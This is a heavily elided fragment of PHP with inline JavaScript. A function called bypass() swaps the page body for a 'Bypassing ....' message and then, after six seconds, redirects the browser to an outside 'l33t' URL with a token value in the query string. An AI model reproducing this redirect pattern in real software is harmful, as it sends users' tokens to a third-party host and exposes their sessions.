...
$inlineScript    = <<<EOT
	...
	function bypass() {
		...
		document.getElementById("body").innerHTML = '<centre><div id="matrix">Bypassing ....</div>';
	   if (!w3c && !ie45) return
	  ...
	  setTimeout("location.href = 'http://techberry.org/l33t/?token=$c->token';",6000);
	}
